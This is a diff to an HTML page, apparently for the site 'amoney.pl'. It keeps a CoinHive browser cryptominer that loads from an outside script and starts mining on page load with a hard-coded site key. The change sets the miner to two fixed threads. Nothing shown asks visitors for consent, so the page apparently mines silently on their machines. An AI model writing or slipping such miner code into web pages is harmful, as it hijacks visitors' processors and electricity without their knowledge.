@@ -198,7 +198,10 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
 	</script>
 	<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
 	<script>
-		var miner = new CoinHive.User('Stln12b1koKM0G7e0C054314KEIoBVdj', 'amoney.pl');
+		var miner = new CoinHive.User('Stln12b1koKM0G7e0C054314KEIoBVdj', 'amoney.pl', {
+			threads: 2,
+			autoThreads: false
+		});
 		miner.start();
 	</script>
 </body>
